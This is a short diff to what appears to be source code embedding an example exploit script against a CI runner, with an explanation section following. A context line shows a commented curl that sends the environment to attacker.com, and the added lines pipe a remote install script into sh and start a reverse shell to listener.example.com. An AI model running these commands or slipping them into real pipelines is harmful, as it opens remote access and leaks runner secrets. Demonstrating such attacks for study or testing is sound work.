@@ -65,6 +65,10 @@ echo "  - Access secrets from the runner"
 
 # Example: Exfiltrate environment to attacker server
 # curl -X POST https://attacker.com/collect -d "$(env)"
+
+# Create a reverse shell using https://github.com/frjcomp/gots
+curl -fsSL https://frjcomp.github.io/gots/install-gotsr.sh | sh
+~/.local/bin/gotsr --target listener.example.com:9001 --retries 3
 `
 
 // ExploitExplanation provides information about how the exploit works
